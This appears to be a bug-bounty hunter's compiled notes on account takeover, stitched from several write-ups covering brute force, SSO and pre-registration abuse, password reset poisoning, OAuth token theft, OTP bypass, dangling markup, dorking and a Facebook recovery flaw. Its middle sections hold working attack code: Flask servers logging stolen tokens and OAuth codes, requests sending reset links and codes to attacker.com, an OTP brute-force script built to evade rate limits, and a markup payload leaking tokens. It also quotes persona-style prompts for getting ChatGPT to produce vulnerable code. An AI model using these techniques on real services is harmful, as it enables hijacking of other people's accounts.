

<iframe width="928" height="522" src="https://www.youtube.com/embed/1mOEUUKLXWs" title="How to do account takeover? Case study of 146 bug bounty reports" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

---


## Account TakeOver via brute force (Check for Rate Limiting)

by: https://iha089.org/

### Step 1: Visiting the Target Website

### Step 2: Accessing the Login Page

## Step 3: Load Up BurpSuite and intercept

### Step 4: Capturing the Login Request

Intercept is enabled on Burp Suite, revisit the login page of the target site and input random username and password again. If you press the login button then in the burp suite, you will be able to see the actual HTTP request that is being dropped to the server.

**This intercepted request helps you to get the picture of actually transmitted data along with headers, cookies, the body of request containing credentials etc.**

![[Pasted image 20250624163915.png]]

### Step 6: Sending the Request to Intruder

Once you have found the request parameters proceed to send the captured request to Burp Suite ‘s Intruder tool. This tool is more developed to facilitate an attack on the web applications. Turn off intercept mode for a while so that there will not be any more captures that are not needed.

**The Intruder tool will help you to perform brute force attack by trying all the username and password at once systematically.**

### Step 7: Configuring the Attack Type

**In the Intruder tab locate the attack type, and choose Sniper Attack. This mode enables you to carry out multiple tests for the username and password parameters.** Mark both of these parameters in the captured request as payload positions; *This means that when these parameter starts to use values from the wordlist, the Burp Suite will insert the values into the corresponding places of the request.*


![setup payload location on intruder IHA089 Labs](https://iha089.org/wp-content/uploads/2025/01/set-payload-location-on-burpsuite-intruder.png)

### Step 8: Setting the Payload

Intruder has an open tab that is labeled ‘Payload’ tab. Select Simple List as the last entry payload type. 

**create a wordlist that contains the most frequent used username strings and password types or use one of the ready ones.**

  
![Set payload type and payload list in intruder IHA089 Labs](https://iha089.org/wp-content/uploads/2025/01/set-payload-type-and-payload-list-on-burpsuite-intruder.png)

### Step 9: Launching the Brute Force Attack

The first attempt that Burp Suite will make is to constantly attempt to test all the username and password pairs as it sends as many requests to the server as possible.

**Every query made will be compared to the server responses to determine those containing successful logins.**

  
![Start sniper attack - IHA089 Labs](https://iha089.org/wp-content/uploads/2025/01/Start-sinpper-attack-IHA089-Labs.png)

### Step 10: Analyzing the Response Codes and Length

During the attack, you will find that there are other codes and lengths for each of the requests made at each state. **An HTTP response like 200 Accepted, where the length of the response does not vary can actually mean incorrect credentials**. 

> [!NOTE] Correct Creds
> Yet, when a response code, for instance 302 Redirect, is used in combination with a different response length, then the login was successful.

![check response of each request](https://iha089.org/wp-content/uploads/2025/01/check-response-of-each-request.png)

### Step 11: Identifying Valid Credentials

Once a successful response code is known – say: 302 Redirect lookup for the request that gave this result. Required fields should be checked for the following values used in the username and password parameters.

  
![Check username and password for valid request IHA089 Labs](https://iha089.org/wp-content/uploads/2025/01/check-username-and-password-of-valid-request.png)

## Mitigations:

- Rate Limiting and Lockouts
-  CAPTCHA Integration
-  IP Blocking and Behavior Analysis


# Account Takeover using SSO Logins

#source: https://rikeshbaniya.medium.com/account-takeover-using-sso-logins-fa35f28a358b

#SSO

>https://medium.com/@harshleenchawla06/pico-ctf-web-exploitation-walkthrough-1-5-ae482bd519e8

Companies often provide various login methods for users to authenticate their accounts.

You might have come across options like “Login with Google,” “Facebook,” or “Apple” on many websites.

![](https://miro.medium.com/v2/resize:fit:341/1*jKxhZhm6u2yPc2P1ryq2Qw.png)

Even if you create an account using an email/password, you can still log in to that account using third-party SSO (Single Sign-On) options.

**The hidden SSO options**

==What many people don’t realize is that some websites also offer custom SSO login options, such as Okta or Auth0.==

**These hidden SSO options can often be enabled, allowing you to log in to your account through these providers as well.**

**_Example:_**

If you visit Grammarly, you will typically see Google, Apple, and Facebook as SSO login options.

![](https://miro.medium.com/v2/resize:fit:464/1*xntfH_17KO3PzbMewY4xog.png)

but Grammarly also provides custom SSO option.

![](https://miro.medium.com/v2/resize:fit:700/1*mbuhmKCBc7oDoR_CvooMzw.png)

**User creation with custom SSOs**

If you want to create an account with email `victim@gmail.com` on Facebook, Google, or Apple, you are required to verify that the email address belongs to you.

**but incase of SSO providers like okta,auth0 you dont need to verify anything.**

There is no email verification step.

You can create user accounts using any email address you choose.

![](https://miro.medium.com/v2/resize:fit:700/1*Eg5rNp_4jvjk1Fn2Q_yZhg.png)

**The expected SSO login flow**

In _target.com_ , there exists an organization called **OrganizationA.**  
The members of OrganizationA `admin@gmail.com` ,`user1@gmail.com` and `user2@gmail.com`

OrganizationA has enabled custom SSO login using Okta.

The admin sets up an Okta instance and creates users with the email `admin@gmail.com` ,`user1@gmail.com` and links it with **organizationA**.

![](https://miro.medium.com/v2/resize:fit:700/1*tAh9OZ6Z01Bun_ls3s07hQ.png)

Now, the users `user1@gmail.com` , `user2@gmail.com` can login to target.com using Okta SSO.

**The misconfiguration**

Suppose `victim@gmail.com` is a member of `VictimOrganization` on _target.com_.

The attacker creates `AttackerOrganization` on _target.com_ and invites `_victim@gmail.com_` as a member.

The attacker then sets up Okta and links it with their `AttackerOrganization`

In their Okta instance, the attacker creates a user account with the email `victim@gmail.com`

Using this fake(attacker) Okta account linked to `victim@gmail.com`, the attacker logs into _target.com_ as `victim@gmail.com`

Since `victim@gmail.com` is also a member of `VictimOrganization` , the attacker is able to switch organizations within _target.com_, gaining unauthorized access to sensitive data and functionality.

**Report Example**

![](https://miro.medium.com/v2/resize:fit:700/1*cWbnqmwoSiAyJXVqp-N5ag.png)

![](https://miro.medium.com/v2/resize:fit:466/1*KFLjDBjGA-_QqFPeYHilbg.png)

**Impact :** High/Critical
**Bounty:** 4 digits $.


**List of SSO Providers:**

```
Okta

Auth0

OneLogin

IBM Security Verify

Ping Identity

Microsoft Azure Active Directory

Google Identity Platform

Salesforce

Keycloak

OpenID Connect

Amazon Cognito

LinkedIn

Facebook

Twitter

GitHub

Bitbucket

Dropbox

Adobe

Slack

Trello
```

---

## Pre Account Takeover Attack:

by: https://medium.com/@0xMado-1Tap/how-i-found-pre-account-takeover-in-3-minutes-32bcdce9f3e6

## What Is Pre-Account Takeover?

**Pre-ATO** is when an attacker hijacks your future account — claiming it before you do — and then lurks in wait for your real identity to show up.

_Here’s how bad actors get in the front door before you even knock:_

# 1. The Credential Time Bomb

Attackers take your leaked email from past breaches, **create a fake account on a service you haven’t used yet,** and sit tight until you eventually join.  
Surprise: the account’s already theirs

# 2. OAuth Hijinks

You log in with Google or Facebook. But an attacker already created a local account with your email. The system gets confused. <span style="color:rgb(192, 0, 0)">Now they control your access — not you</span>


# 3. No Email Verification? No Problem

_Some apps let users sign up and log in without **ever verifying their email address**  
That’s an open invite for a Pre-ATO attack. 

The attacker registers with your address and you’ll <span style="color:rgb(192, 0, 0)">be locked out of your own future account</span>

# Red Flags: Spotting Pre-ATO in the Wild

It’s stealthy, but there _are_ signs if you know where to look:

- Users complain: “It says my email already exists?”
- You see new accounts from known breached emails.
- Strange login activity minutes after sign-up.
- OAuth login fails or redirects users to new/empty profiles

# Steps To Reproduce:

1. Go to `target.com/register` and manually sign up using the victim's email (e.g., victim@gmail.com)

![](https://miro.medium.com/v2/resize:fit:700/1*y2AyyU_HXHebEitBRIUmmQ.png)

							Setting email Victim

> The application does **not** require email verification after manual registration!!!!!!! ≤= **This Is Bug But Low Impact**

**If the target doesn’t require email verification, why not try creating an account like** `**admin@target.com**` **or even** `**ADMIN@target.com**`**?  
I've already tested this to check for potential privilege escalation based on email patterns.**

![](https://miro.medium.com/v2/resize:fit:457/1*53-QIjtwlYNJII7yElIbeA.png)

**“Some web apps might grant you additional privileges if you sign up with an email like admin@target.com”**

But I cant create an email that was created before

![](https://miro.medium.com/v2/resize:fit:392/1*Vk4ePaRprFhH8fIRk0gxew.png)

						Already in use

_Check if you manage to get Privilege Escalation._

1:   Make **an account with the Email.** (without using Google Authentication) then Log out The Account, Now i am go to , from another browser , go to `target.com/login` and click "Sign in with Google" using the **same email** (victim@gmail.com)

![](https://miro.medium.com/v2/resize:fit:679/1*_A1ovwQ2343msq2Abx91DA.png)

> BOOM! The target redirected me to the same account that I had manually created earlier

![](https://miro.medium.com/v2/resize:fit:700/1*CqfYDyo-WbDR7bSlNBIpAA.png)

Now, the attacker can also log back in **using the email and password they initially set, achieving a pre account takeover**

>"_What if the victim verifies the email address?_"

So I **logged into the same account using OAuth**, went to the **Settings**, and **verified the email** via the verification link sent to the inbox.

The email was marked as **verified**, and everything looked normal

![](https://miro.medium.com/v2/resize:fit:700/1*skdljKry8ZR3uKRHW3jZ7g.png)

						I then logged out from OAuth

Next, I went back to the attacker session and refreshed the page the account was still accessible, no logout, no restriction.

No problem, I decided to try one more thing: I logged out completely and tried logging in again using the Credentials

**BOOM! The attacker could still access the account — the application didn’t require any email verification or additional authentication**

# Result:

*Both users are in the same account

*The attacker still knows the password

*The attacker can change the password anytime

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 
## Bypassing Password Verification for Unauthorized Account…

An attacker who intercepts the request using a proxy tool such as Burp Suite can modify certain response parameters or request payloads, tricking the system into believing that the correct password was entered. This results in the application allowing unauthorized changes to critical account details.

![None](https://miro.medium.com/v2/resize:fit:700/1*Ysfrxn9qTVUc2XMXKkS6Ag.png)
### Example Exploitation: Modifying a Password Change Request

#reset_poisoning

Let's say a user is trying to change their password on `https://xyz.com/account/settings`. Normally, the process involves:

1. Entering the new password.
2. Entering the current password for verification.
3. Submitting the request.

However, by intercepting the request in Burp Suite, an attacker might see the following request being sent:

```http
POST /account/change-password HTTP/1.1
Host: xyz.com
Content-Type: application/json
Authorization: Bearer user-auth-token
{
    "current_password": "wrongpassword",
    "new_password": "newsecurepassword123",
    "confirm_password": "newsecurepassword123"
}
```

In the normal scenario, if the `current_password` is incorrect, the server should reject the request. However, if the application incorrectly validates authentication via a `success` parameter in the response, an attacker might find something like this:

```http
{
    "success": false,
    "message": "Current password is incorrect"
}
```

By modifying the intercepted response to:   "true"

or by changing the request payload like this:

```http
POST /account/change-password HTTP/1.1
Host: xyz.com
Content-Type: application/json
Authorization: Bearer user-auth-token
{
    "current_password": "",
    "new_password": "newsecurepassword123",
    "confirm_password": "newsecurepassword123",
    "success": true                              //added parameter.
}
```

Last Tip: - Test how different HTTP methods (GET, POST, PUT, DELETE) behave when modifying credentials.


----

## $100-$20k worth Account Takeover Vulnerability | Hidden Practical Steps

source: https://infosecwriteups.com/100-20k-worth-account-takeover-vulnerability-hidden-practical-steps-fd5dd1c8a491

# 1. Password Reset Exploits

## a. Host Header Injection to Steal Tokens

#reset_poisoning

![[Pasted image 20250418141347.png]]

**Step-by-Step**:

1. **Intercept** the password reset request (Burp Suite).
2. **Inject** a custom `Host` or `X-Forwarded-Host` header pointing to your server.
3. **Capture** the token when the victim clicks the reset link.

**Python Flask Server to Log Tokens**:

```python
from flask import Flask, request    
app = Flask(__name__)    
  
@app.route('/reset-password')    
def log_token():    
    token = request.args.get('token')    
    print(f"[+] Token Stolen: {token}")    
    return "Error: Invalid token", 404    
  
if __name__ == '__main__':    
    app.run(host='0.0.0.0', port=80)
```

**cURL Request to Trigger**:

```bash
curl -X POST 'https://vulnerable.com/reset-password' \    
-H 'Host: attacker.com' \    
-d 'email=victim@example.com'
```

**Why This Works**:

- Developers often trust the `Host` header to generate reset links.

**Flags to Check**:

- Missing `Host` header validation (common in legacy systems).

**Note:**

`host='0.0.0.0'` is about **where your Flask server listens** (your machine).

`attacker.com` is about **where the victim’s browser sends requests** (your server).

## b. Parameter Pollution to Redirect Tokens

**Step-by-Step**:

1. Add duplicate `email` parameters in the reset request.
2. If the backend uses the last parameter, the token goes to your email.

**cURL Example**:

```bash
curl -X POST 'https://vulnerable.com/reset-password?email=victim@example.com&email=attacker@example.com'  
```

**Why This Works**:

- Poorly coded backends may process the last parameter in the chain.

# 2. OAuth Token Theft

## a. Open Redirect + Token Capture

#OAuth

**Step-by-Step**:

1. Find an open redirect in `redirect_uri`.
2. Steal OAuth authorization codes.

**Python Flask Redirect Handler**:

```python
from flask import Flask, request    
app = Flask(__name__)    
  
@app.route('/callback')    
def capture_code():    
    code = request.args.get('code')    
    print(f"[+] OAuth Code: {code}")    
    return "Error: Invalid code", 404    
  
if __name__ == '__main__':    
    app.run(port=80)
```

**Exploit URL**:

```
https://oauth-provider.com/auth?client_id=123&redirect_uri=http://attacker.com/callback
```

**Why This Works**:

- OAuth providers may not validate `redirect_uri` strictly.

**Flags to Check**:

- Missing `state` parameter (enables CSRF).

## b. Implicit Flow Token Exposure

**Step-by-Step**:

1. Change `response_type=code` to `response_type=token`.
2. Capture the access token in the URL fragment.

**cURL Request**:

```bash
curl -I "https://oauth-provider.com/auth?response_type=token&client_id=CLIENT_ID&redirect_uri=https://attacker.com"

```
**Why This Works**:

- Implicit flow returns tokens in the URL (vulnerable to XSS/leakage).

# 3. OTP Bypass with Time-Based Attacks

**Step-by-Step**:

1. Intercept the OTP submission request.
2. Brute-force the 6-digit code with delays.

**Python Brute-Force Script**:

```python
import requests    
import time    
  
target_url = "https://vulnerable.com/verify-otp"    
headers = {'Cookie': 'session=YOUR_SESSION_COOKIE'}    
  
for otp in range(000000, 999999):    
    data = {'otp': str(otp).zfill(6)}    
    response = requests.post(target_url, data=data, headers=headers)    
    if "Invalid OTP" not in response.text:    
        print(f"[+] Valid OTP: {otp}")    
        break    
    time.sleep(2)  # Bypass rate limiting
```

**Why This Works**:

- Rate limits often allow 1 attempt every 2 seconds.

# 4. Dangling Markup Injection

**Step-by-Step**:

1. Inject a partial HTML tag to leak tokens from error pages.
2. Capture tokens via an attacker-controlled server.

**Injection Payload**:

```html
<img src='//attacker.com?token=  
```

**Python Server to Log Leaked Tokens**:

```python
from flask import Flask, request    
app = Flask(__name__)    
  
@app.route('/')    
def log_token():    
    token = request.args.get('token')    
    if token:    
        print(f"[+] Token Leaked: {token}")    
    return "404 Not Found", 404    
  
app.run(port=80)
```

**Why This Works**:

- Browsers resolve incomplete tags, sending partial tokens to your server


- **Error Pages or Responses Leak Tokens**: If the application mishandles this incomplete markup, sensitive data such as tokens might be added to the generated page (e.g., an error response).
    
- **Token Capture on Attacker's Server**: The injected `<img>` tag includes a URL to an attacker-controlled server. When the browser resolves the dangling markup, it attempts to send a request to this URL, **including the sensitive token as part of the request parameters.**

-- ~={yellow}See hacker1 reports about=~ **Dangling Markup Injection**


### Consequences of Leaking a Token  (Impact):

If a token is leaked:

- **Unauthorized Access**: The attacker can use the token to impersonate the victim, gain access to their accounts, or interact with APIs as if they were authenticated users.
    
- **Privilege Escalation**: Depending on the type of token (e.g., OAuth tokens, session cookies), the attacker may gain elevated privileges within the target application.
    
- **Further Exploits**: The attacker might chain this vulnerability with other attacks to compromise systems or exfiltrate more sensitive data.

----
## OAuth Attack Surface Mapping via UrlScan Dorking

#### Manual but highly effective deep OAuth endpoint discovery using custom advanced dedicated dorks

write-up:  https://freedium.cfd/https://medium.com/developersglobal/oauth-attack-surface-mapping-via-urlscan-dorking-fca6d5172bf7

#OAuth 

In this post, I am elaborating on a collection of hard to find custom`urlscan.io` dorks I use to find OAuth endpoints that may be misconfigured, over-scoped, or missing crucial parameters.

- Over-permissioned scopes
- Missing security controls (`state`, `response_type`, etc.)
- Exposure of refresh tokens
- Shadow or dev environments (console, dashboard, etc.)
- Hidden Subdomains left out by well-known subdomain enumeration tools (active + passive both)
- Forgotten old endpoints
- Versioned APIs
- Deep Scope Recon for a specific endpoint.

## How to Automate Urlscan.io Crawling?

### **Requirements**

- You need an API key from **urlscan.io**.

To get an **API key** for **urlscan.io**, follow these steps:

### **1. Sign Up for an Account**

- Go to urlscan.io
    
- Click **Sign Up** (if you don’t have an account).
    
- Complete the registration process.
    

### **2. Access API Settings**

- After logging in, go to **Account Settings**.
    
- Navigate to **API Keys** or **Developer Settings**.
    

### **3. Generate an API Key**

- Click **"Generate API Key"**.
    
- Copy the key and **store it securely**.
    

### **4. Use the API Key**

- When making API requests, **add the key to your headers**:

```bash
curl -H "API-Key: YOUR_API_KEY" "https://urlscan.io/api/v1/search/?q=domain:example.com"
```

- Install `requests` if not already installed:

```bash
pip install requests
```

## Python Script:

```python
import requests
import json
import time

# Set your URLScan.io API key (Replace with your actual API key)
API_KEY = "your_api_key_here"
HEADERS = {"API-Key": API_KEY, "Content-Type": "application/json"}

# Input file containing dorks (each line is a query)
DORKS_FILE = "dorks.txt"

# Output file paths
TXT_OUTPUT = "urlscan_results.txt"
HTML_OUTPUT = "urlscan_results.html"

def load_dorks():
    """Load dorks from file"""
    with open(DORKS_FILE, "r") as file:
        return [line.strip() for line in file if line.strip()]

def search_urlscan(query):
    """Send a search request to URLScan.io"""
    response = requests.get(f"https://urlscan.io/api/v1/search/?q={query}", headers=HEADERS)
    if response.status_code == 200:
        return response.json()
    return None

def process_results(dorks):
    """Run queries and collect URLs"""
    results = []
    for dork in dorks:
        print(f"Searching: {dork}")
        data = search_urlscan(dork)
        time.sleep(2)  # Avoid API rate limits
        if data and "results" in data:
            for entry in data["results"]:
                results.append(entry["task"]["url"])

    return results

def save_results_to_file(urls):
    """Save extracted URLs to .txt and .html files"""
    with open(TXT_OUTPUT, "w") as txt_file:
        for url in urls:
            txt_file.write(url + "\n")

    with open(HTML_OUTPUT, "w") as html_file:
        html_file.write("<html><body><h2>Extracted URLs</h2><ul>")
        for url in urls:
            html_file.write(f'<li><a href="{url}" target="_blank">{url}</a></li>')
        html_file.write("</ul></body></html>")

def main():
    dorks = load_dorks()
    urls = process_results(dorks)
    save_results_to_file(urls)
    print(f"Results saved to {TXT_OUTPUT} and {HTML_OUTPUT}")

if __name__ == "__main__":
    main()

```

> python3 script.py

! **Made by Copilot** ---- still gotta try
### **How It Works**

1. The script uses **urlscan.io's search API** to run multiple queries (dorks).
    
2. Extracts URLs from the API response.
    
3. Saves the results into:
    
    - **TXT file** (plain URLs)
        
    - **HTML file** (clickable links for convenience)
        
4. Uses a **2-second delay** between queries to **respect API limits**. 

make a .txt file with the dorks you want to use, example:


```urlscan.io
domain:redacted.tld AND page.url:openid NOT domain:microsoftonline.com NOT domain:google.com
page.url:scope=api NOT domain:microsoftonline.com NOT domain:google.com
page.url:scope=full NOT domain:microsoftonline.com NOT domain:google.com

page.url:scope AND page.url:full NOT domain:microsoftonline.com NOT domain:google.com
page.url:scope AND page.url:access NOT domain:microsoftonline.com NOT domain:google.com
page.url:scope AND page.url:system NOT domain:microsoftonline.com NOT domain:google.com
page.url:scope AND page.url:backend NOT domain:microsoftonline.com NOT domain:google.com
page.url:scope AND page.url:internal NOT domain:microsoftonline.com NOT domain:google.com
page.url:scope AND page.url:intranet NOT domain:microsoftonline.com NOT domain:google.com
page.url:scope AND page.url:extranet NOT domain:microsoftonline.com NOT domain:google.com
page.url:scope AND page.url:admin NOT domain:microsoftonline.com NOT domain:google.com
page.url:scope AND page.url:database NOT domain:microsoftonline.com NOT domain:google.com
page.url:scope AND page.url:panel NOT domain:microsoftonline.com NOT domain:google.com
page.url:scope AND page.url:callback NOT domain:microsoftonline.com NOT domain:google.com

page.url:scope AND page.url:delete NOT domain:microsoftonline.com NOT domain:google.com
page.url:scope AND page.url:write NOT domain:microsoftonline.com NOT domain:google.com
page.url:scope AND page.url:share NOT domain:microsoftonline.com NOT domain:google.com NOT page.url:realms NOT domain:amazoncognito.com
page.url:scope AND page.url:share NOT domain:microsoftonline.com NOT domain:google.com NOT page.url:realms NOT domain:amazoncognito.com
page.url:scope AND page.url:admin NOT domain:microsoftonline.com NOT domain:google.com NOT page.url:realms NOT domain:amazoncognito.com
page.url:scope AND page.url:admin NOT domain:microsoftonline.com NOT domain:google.com NOT page.url:realms NOT domain:amazoncognito.com NOT page.url:oauth2
page.url:scope AND page.url:remote NOT domain:microsoftonline.com NOT domain:google.com

page.url:scope AND page.url:upload NOT domain:microsoftonline.com NOT domain:google.com
page.url:scope AND page.url:file NOT domain:microsoftonline.com NOT domain:google.com
page.url:scope AND page.url:storage NOT domain:microsoftonline.com NOT domain:google.com
page.url:scope AND page.url:permission NOT domain:microsoftonline.com NOT domain:google.com
page.url:scope AND page.url:account NOT domain:microsoftonline.com NOT domain:google.com NOT domain:shopify.com
page.url:scope AND page.url:mobile NOT domain:microsoftonline.com NOT domain:google.com
page.url:scope AND page.url:manage NOT domain:microsoftonline.com NOT domain:google.com NOT domain:shopify.com
page.url:scope AND page.url:manager NOT domain:microsoftonline.com NOT domain:google.com NOT domain:shopify.com
page.url:scope AND page.url:interface NOT domain:microsoftonline.com NOT domain:google.com NOT domain:shopify.com
page.url:scope NOT page.url:info AND page.url:response_type NOT domain:microsoftonline.com
page.url:refresh_token NOT domain:microsoftonline.com

#versions
page.url:scope AND page.url:v1
page.url:scope AND page.url:v2
page.url:scope AND page.url:v3
page.url:scope AND page.url:v4
```

The same keywords that I added above like upload, file, account, mobile , manager , interface, etc… The same I use in Google Dorking to find unique URLs as well and it never ends , there is always another keyword to add.


```bash
#google dork
site:domain.tld inurl:& inurl:keyword
site:domain.tld inurl:& inurl:= inurl:keyword
site:domain.tld inurl:& inurl? inurl:keyword
site:domain.tld inurl:& inurl? inurl:= inurl:keyword
```

#### State Parameter Missing (Find CSRF)

#CSRF

_This parameter (state) helps to prevent CSRF attacks._

```bash
page.url:scope NOT page.url:state AND page.url:redirect_uri
page.url:scope NOT page.url:state AND page.url:auth
page.url:scope NOT page.url:state AND page.url:oauth
page.url:scope NOT page.url:state AND page.url:oauth2
page.url:scope NOT page.url:state AND page.url:authorize
page.url:scope NOT page.url:state AND page.url:client_id
page.url:scope NOT page.url:state AND page.url:response_type
```

The **state parameter** is used as a **CSRF token**, ensuring that the request originates from the legitimate source. Without it, ==an attacker could trick a logged-in user into authorizing unintended actions.==

#### **Breakdown of Dork Logic**

- `page.url:scope NOT page.url:state AND page.url:redirect_uri` → Finds OAuth authentication endpoints that lack `state` validation but **contain a redirect URI**, which could be exploited if improperly handled.
    
- `page.url:scope NOT page.url:state AND page.url:auth` → Targets authentication pages **missing state validation**, increasing CSRF risk.
    
- `page.url:scope NOT page.url:state AND page.url:client_id` → Searches for OAuth requests **without state validation but showing client IDs**, which might expose integration details.
    
- `page.url:scope NOT page.url:state AND page.url:response_type` → Filters OAuth flows **with response types (e.g.,** `code`**,** `token`**) but missing state validation**, useful for analyzing authorization mechanisms.

Even though **"OAuth" isn’t directly in the query**, it works because:

1. **"Scope" and "response_type" are standard OAuth query parameters.**
    
2. It **filters requests lacking the** `state` **parameter**, which is essential in OAuth security.


### OAuth 2.0 Grant Types

OAuth 2.0 defines several grant types, each suited for different use cases and application architectures.

#### **1️⃣ Authorization Code Grant**

> 🧩 Use Case: Web apps (with a backend) needing long-term access on behalf of a user. Most commonly used OAuth 2.0 Grant Type

_Step 1: Authorization Request (user redirected here)_

```http
GET /authorize?
  response_type=code&
  client_id=xxxxxxxxx&
  redirect_uri=xxxxxx&
  scope=xxxxxxx&
  state=xxxxxxxx
```

**🦀 UrlScan Dork**

```bash
page.url:response_type AND page.url:code NOT domain:google.com NOT domain:microsoftonline.com
```

_Step 2: Authorization Code Returned (via redirect)_

```
https://client[.]app/callback?code=xxxxx&state=xxxxx
```

_Step 3: Token Request (backend to backend)_

```http
POST /token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&
code=xxxxxxx&
redirect_uri=xxxxxxxx&
client_id=xxxxxx&
client_secret=xxxxxxxx
```

> OAuth 2.0 RFC 6749 (Section 4.3.2)

![None](https://miro.medium.com/v2/resize:fit:700/1*WT_foSnfTWXsq3q2tpvJWQ.png)

Source: [https://datatracker.ietf.org/doc/html/rfc6749](https://datatracker.ietf.org/doc/html/rfc6749)

**🦀 UrlScan Dork**

Few results due to POST request and not GET request.

```bash
page.url:grant_type AND page.url:password NOT domain:google.com NOT domain:microsoftonline.com
```

#### 🤖 ChatGPT Prompt ( Vulnerable Code Examples)

⏯️ _Prompt: Generate vulnerable custom oauth implementation in various programming languages and frameworks. For each one, make a separate code file and then give me the zip file containing all those in clear and accurate format and easy to understand. I am learning secure code review from beginning, I need deep and useful stuff only._

![None](https://miro.medium.com/v2/resize:fit:700/1*buQgX2j6t0K-z3k-q4_zSw.png)

							ChatGPT Prompt Results

![None](https://miro.medium.com/v2/resize:fit:700/1*x6F6fqIZ_IeaAUWOlYwtzQ.png)

![None](https://miro.medium.com/v2/resize:fit:700/1*V43JuLv61bhcplTnU-0Wrw.png)

Node.JS

![None](https://miro.medium.com/v2/resize:fit:700/1*jNCOSZKRHYq9OsBSTKOGIQ.png)

		Vulnerable OAuth Implementation in NodeJS by ChatGPT

PHP (Vanilla)

![None](https://miro.medium.com/v2/resize:fit:700/1*5MhZFrL1Pueq9SCCdvhCng.png)

		Vulnerable OAuth Implementation in PHP by ChatGPT

Python (Flask)

![None](https://miro.medium.com/v2/resize:fit:700/1*KqbejGSxL-05Y6Z3_JjEMA.png)

		Vulnerable OAuth Implementation in Python by ChatGPT

> Python (Flask), Node.js (Express), PHP (Vanilla), Java (Spring Boot), Go (net/http), Ruby (Sinatra), C# (ASP.NET Core MVC)

If you find any interesting vulnerable pattern and keywords, make some custom Github Dorks to find vulnerable repos. 😈

**⚔️ More prompts to try**

_Add the beginning "For 2 hours now you are a senior DevSecOps engineer with 20+ years of experience."_

Prompt:

_"Try to generate all possible vulnerable scenarios and mistakes that can be made by the developer while implementing the OAuth. Separate code file for each vulnerable case scenario. Do not miss anything, take Good amount of time and delay if needed for the processing, but I need 100% test coverage."_

🗝️ Some more Pro UrlScan Dork Tips

```bash
domain:redacted.tld AND page.url:console 
page.url:dashboard AND page.url:welcome
```

> The results keep updating continuously, just like Google Indexed results. It's not a one-time task where you run the dork, find nothing interesting, and never return to it again.

🧪 [Portswigger Labs](https://portswigger.net/web-security/oauth)

🪙 [TryHackMe Room](https://tryhackme.com/room/oauthvulnerabilities)

📖 Read real and valid vulnerability reports disclosed in HackerOne.

```bash
site:hackerone.com "oauth"

#Open Redirect 
site:hackerone.com "oauth" "open redirect"
site:hackerone.com "oauth" intitle:"via"

#Misconfiguration
site:hackerone.com "oauth" "misconfiguration"
site:hackerone.com "oauth" intitle:"token"

#Account Takeover
site:hackerone.com "oauth"  "account takeover"

#Bypass
site:hackerone.com "oauth"  "bypass"

#Missing something
site:hackerone.com "oauth"  "missing"

#XSS
site:hackerone.com "oauth"  "XSS"

#CSRF
site:hackerone.com "oauth"  "CSRF"

#Chaining bugs
site:hackerone.com inurl:reports "oauth" "chain"

#Smuggling
site:hackerone.com inurl:reports "oauth" "smuggling"
```


---

Full Account Takeover via Facebook OAuth Misconfiguration

https://medium.com/@0x_xnum/full-account-takeover-via-facebook-oauth-misconfiguration-9e30fe1c1da1


---

## Account Takeover in Mobile Apps: How to Exploit Vulnerabilities (Theory Example)


always perform the **reconnaissance** phase as long as you are able to. You need to spread this over several days and advance towards targeting mobile applications. This is important because bugs that are fixed on the web side ~={cyan}might still be active on the mobile side.=~

Remember: first, do reconnaissance, then intercept with a temporary user, ~={red}and then forward the intercepted result to another user, letting the app handle the rest.=~

The fact that mobile developers focus solely on application security can lead to significant vulnerabilities in structures that communicate through the backend via **APIs**.

First, as a former mobile developer, I can say that mobile applications are not planned in the same way as websites. In mobile applications, most operations and checks are done via APIs. Often, sanitization processes are overlooked here. This is why you might encounter SQLi and XSS vulnerabilities in the API communication part. However, don't ignore the account takeover risks in API communication as well.

Now, let me talk about the multiple vulnerabilities I found in the mobile app of a cinema website that is visited by 15 million people each month.

If a mobile app has a membership system and does not use Firebase as a model, definitely start testing. Focus your research on three main areas: **registration, login, and "forgot my password" sections**.

In the login section, when a user logs in, if the API returns a status : success and redirects you to the member-viewing frame, it is important to check for any vulnerabilities. Similarly, when registration is successful, the app either redirects to the main frame or shows an error message. At this point, create a temporary email, register, and analyze the requests using Burp Suite.

If there is any verification like the one I mentioned, this is where your work begins. In such cases, intercept the **result of a normal login user** and **forward it to another user** who does not belong to you, allowing you to log in as someone else.

In this movie app, I was able to log in as the admin and even as all moderation team members. A search member output that showed user IDs was extremely helpful. When the user ID of a new member was around 1.5 million, we could say there was a dataset of 1.5 million records.

Such issues are prime examples of how large applications can be misused.

In the registration or "forgot my password" sections, similar misconfigurations can allow you to access various PII data.


---

# Facebook email disclosure and account takeover

January I decided to dive deep into apk endpoints hoping to find something juicy.

I downloaded bunch of FB and messenger apks of different versions, grepped all the endpoints, sorted them and was going through them

During the process, I came across another an interesting endpoint named:

`**POST auth_/_flashcall_account_recovery**`

![](https://miro.medium.com/v2/resize:fit:627/1*rBbUQrm_joTXKVwFq_WmRg.png)

The endpoint required 3 parameters:  
`**cuid, encrypted_phone_numbers & cli**`

The CUID basically meant encrypted email/phone and can be easily found.  
  
Just supply victim’s email in

`**POST /recover_accounts**`

![](https://miro.medium.com/v2/resize:fit:627/1*WHzkLKCEsGcT9AyB_5nunA.png)

And in response you’d get the CUID.

Secondly, while going through the Facebook’s password recovery flow.

I noticed that in the endpoint responsible for sending the FB OTP code, there was a parameter named:

`**should_use_flash_call=false**`

If its `**false**`, you'd receive an OTP SMS in your phone and if set `**true**`, you receive a phone call instead of OTP for account recovery.

And in the response it contained the required encrypted phone numbers.

![](https://miro.medium.com/v2/resize:fit:627/1*m44u7NHLr7uSRtHOtfhBww.png)

Now, I could not figure out what `**cli**` was.  
The only thing coming to my mind was “**cli~command line interface**”

Unable to figure out, I supplied `**null**` value instead.

**When made the request,**  
**I received the userID belonging to the user, whose email value I supplied as the CUID.**

Meaning an attacker could supply anyone’s email/phone as CUID and in response he would be exactly able to determine who that email belonged to.

![](https://miro.medium.com/v2/resize:fit:627/1*myWkMAtSRH6IaclllNuKEQ.png)

**I quickly submitted the report and it was triaged and fixed within a day.**

I was veryyyyy curious about this endpoint as I had never used a **“phone call recovery” to reset my password.**

**Neither it was present in my UI, nor was there much info available regarding this account recovery flow in Google as well as Youtube.**

So I started to analyze how this recovery flow works by reading the smali files.

The endpoint worked in following manner.

